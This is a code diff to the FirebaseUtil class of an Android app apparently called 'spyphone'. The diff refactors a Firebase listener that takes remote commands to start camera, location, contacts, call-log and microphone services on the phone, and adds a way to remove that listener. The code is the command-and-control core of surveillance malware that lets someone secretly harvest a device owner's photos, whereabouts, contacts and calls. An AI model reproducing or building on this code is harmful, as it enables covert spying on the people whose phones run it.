@@ -29,19 +29,21 @@ import emit.esy.es.spyphone.services.LocationService;
 public class FirebaseUtil {
 
     private static final String LOG_TAG = "FirebaseUtil";
-    String username, password;
+    static String musername, mpassword;
     volatile String id;
     Firebase ref, userRef;
-    Context context;
+    static Context mcontext;
 
     public FirebaseUtil(Context context, String username, String password){
-        this.context = context;
-        this.username = username;
-        this.password = password;
+        mcontext = context;
+        musername = username;
+        mpassword = password;
     }
 
+
+
     private void createUser() {
-        ref.createUser(username, password, new Firebase.ValueResultHandler<Map<String, Object>>() {
+        ref.createUser(musername, mpassword, new Firebase.ValueResultHandler<Map<String, Object>>() {
 
             @Override
             public void onSuccess(Map<String, Object> result) {
@@ -62,8 +64,8 @@ public class FirebaseUtil {
     }
 
     public void authenticateUser() {
-        ref = new Firebase(context.getString(R.string.domain));
-        ref.authWithPassword(username, password, new Firebase.AuthResultHandler() {
+        ref = new Firebase(mcontext.getString(R.string.domain));
+        ref.authWithPassword(musername, mpassword, new Firebase.AuthResultHandler() {
 
             @Override
             public void onAuthenticated(AuthData authData) {
@@ -106,8 +108,8 @@ public class FirebaseUtil {
         //set value for content (switch case for content return value)
         switch(action){
             case "photo":
-                content = data.getString("content");
-                context.stopService(new Intent(context, CameraService.class));
+                content = data.getStringArrayList("content");
+                mcontext.stopService(new Intent(mcontext, CameraService.class));
                 break;
             case "cords":
                 content = data.getDoubleArray("content");
@@ -127,6 +129,97 @@ public class FirebaseUtil {
         return userRef.child("androidWrite");
     }
 
+    ChildEventListener cel = new ChildEventListener() {
+        @Override
+        public void onChildAdded(DataSnapshot dataSnapshot, String s) {
+            String child = dataSnapshot.getValue().toString();
+            Log.d("ChildAdded", dataSnapshot.getKey() +" : "+child);
+
+        }
+
+        @Override
+        public void onChildChanged(DataSnapshot dataSnapshot, String s) {
+            String child = dataSnapshot.getKey();
+
+            Log.d("ChildChanged", child);
+
+            //check if androidRead has changed
+            if(child.equals("androidRead")){
+                //check if androidRead has a string or a map of strings as a value
+                try{
+                    Intent intent;
+                    //if is a string
+                    String childValue = (String)dataSnapshot.getValue();
+                    switch (childValue){
+                        case "photo":
+                            Log.d(LOG_TAG, "Starting photo service");
+                            intent = new Intent(mcontext, CameraService.class);
+                            intent.putExtra("messenger", new Messenger(handler));
+                            mcontext.startService(intent);
+                            setOnDefaultAndroidRead(dataSnapshot);
+                            break;
+                        case "cords":
+                            Log.d(LOG_TAG, "Starting geo service");
+                            intent = new Intent(mcontext, LocationService.class);
+                            intent.putExtra("messenger", new Messenger(handler));
+                            mcontext.startService(intent);
+                            setOnDefaultAndroidRead(dataSnapshot);
+                            break;
+                        case "contacts":
+                            Log.d(LOG_TAG, "Starting contacts service");
+                            intent = new Intent(mcontext, ContactsService.class);
+                            intent.putExtra("messenger", new Messenger(handler));
+                            mcontext.startService(intent);
+                            setOnDefaultAndroidRead(dataSnapshot);
+                            break;
+                        case "callLog":
+                            Log.d(LOG_TAG, "Starting call log service");
+                            intent = new Intent(mcontext, CallLogService.class);
+                            intent.putExtra("messenger", new Messenger(handler));
+                            mcontext.startService(intent);
+                            setOnDefaultAndroidRead(dataSnapshot);
+                            break;
+                        default:
+                            Log.d(LOG_TAG, "Wrong action, nothing to start. Value is " + childValue);
+                            break;
+                    }
+                } catch (Exception e){
+                    //if is a map
+                    Map<String, Object> childValue;
+                    childValue = (Map<String, Object>) dataSnapshot.getValue();
+                    String action = childValue.get("action").toString();
+
+                    switch (action){
+                        case "mic":
+                            long duration = (long) childValue.get("secondParam");
+                            Log.d(LOG_TAG, "Starting mic service with duration " + Long.toString(duration) + " sec");
+                            //create intent to start microphone recording service with duration of recording
+
+                            setOnDefaultAndroidRead(dataSnapshot);
+                            break;
+                    }
+                }
+
+            }
+
+        }
+
+        @Override
+        public void onChildRemoved(DataSnapshot dataSnapshot) {
+
+        }
+
+        @Override
+        public void onChildMoved(DataSnapshot dataSnapshot, String s) {
+
+        }
+
+        @Override
+        public void onCancelled(FirebaseError firebaseError) {
+
+        }
+    };
+
     public void setUpChildRef() {
         Log.d(LOG_TAG, "setUpChildRef");
         if(id != null){
@@ -135,97 +228,17 @@ public class FirebaseUtil {
 
             setOnline(id, true);
 
-            userRef.addChildEventListener(new ChildEventListener() {
-                @Override
-                public void onChildAdded(DataSnapshot dataSnapshot, String s) {
-                    String child = dataSnapshot.getValue().toString();
-                    Log.d("ChildAdded", dataSnapshot.getKey() +" : "+child);
+            userRef.addChildEventListener(cel);
 
-                }
+        }
+    }
 
-                @Override
-                public void onChildChanged(DataSnapshot dataSnapshot, String s) {
-                    String child = dataSnapshot.getKey();
-
-                    Log.d("ChildChanged", child);
-
-                    //check if androidRead has changed
-                    if(child.equals("androidRead")){
-                        //check if androidRead has a string or a map of strings as a value
-                        try{
-                            Intent intent;
-                            //if is a string
-                            String childValue = (String)dataSnapshot.getValue();
-                            switch (childValue){
-                                case "photo":
-                                    Log.d(LOG_TAG, "Starting photo service");
-                                    intent = new Intent(context, CameraService.class);
-                                    intent.putExtra("messenger", new Messenger(handler));
-                                    context.startService(intent);
-                                    setOnDefaultAndroidRead(dataSnapshot);
-                                    break;
-                                case "cords":
-                                    Log.d(LOG_TAG, "Starting geo service");
-                                    intent = new Intent(context, LocationService.class);
-                                    intent.putExtra("messenger", new Messenger(handler));
-                                    context.startService(intent);
-                                    setOnDefaultAndroidRead(dataSnapshot);
-                                    break;
-                                case "contacts":
-                                    Log.d(LOG_TAG, "Starting contacts service");
-                                    intent = new Intent(context, ContactsService.class);
-                                    intent.putExtra("messenger", new Messenger(handler));
-                                    context.startService(intent);
-                                    setOnDefaultAndroidRead(dataSnapshot);
-                                    break;
-                                case "callLog":
-                                    Log.d(LOG_TAG, "Starting call log service");
-                                    intent = new Intent(context, CallLogService.class);
-                                    intent.putExtra("messenger", new Messenger(handler));
-                                    context.startService(intent);
-                                    setOnDefaultAndroidRead(dataSnapshot);
-                                    break;
-                                default:
-                                    Log.d(LOG_TAG, "Wrong action, nothing to start. Value is " + childValue);
-                                    break;
-                            }
-                        } catch (Exception e){
-                            //if is a map
-                            Map<String, Object> childValue;
-                            childValue = (Map<String, Object>) dataSnapshot.getValue();
-                            String action = childValue.get("action").toString();
-
-                            switch (action){
-                                case "mic":
-                                    long duration = (long) childValue.get("secondParam");
-                                    Log.d(LOG_TAG, "Starting mic service with duration " + Long.toString(duration) + " sec");
-                                    //create intent to start microphone recording service with duration of recording
-
-                                    setOnDefaultAndroidRead(dataSnapshot);
-                                    break;
-                            }
-                        }
-
-                    }
-
-                }
-
-                @Override
-                public void onChildRemoved(DataSnapshot dataSnapshot) {
-
-                }
-
-                @Override
-                public void onChildMoved(DataSnapshot dataSnapshot, String s) {
-
-                }
-
-                @Override
-                public void onCancelled(FirebaseError firebaseError) {
-
-                }
-            });
-
+    public void removeListener(){
+        try {
+            userRef.removeEventListener(cel);
+            Log.d(LOG_TAG, "Listener removed");
+        } catch (Exception e){
+            Log.d(LOG_TAG, "No listener to remove");
         }
     }
 
@@ -245,8 +258,11 @@ public class FirebaseUtil {
             userRef.updateChildren(user);
             userRef.onDisconnect().updateChildren(connOnline);
         } else {
+            removeListener();
             userRef.setValue(user);
             userRef.onDisconnect().updateChildren(connOnline);
         }
     }
+
+
 }
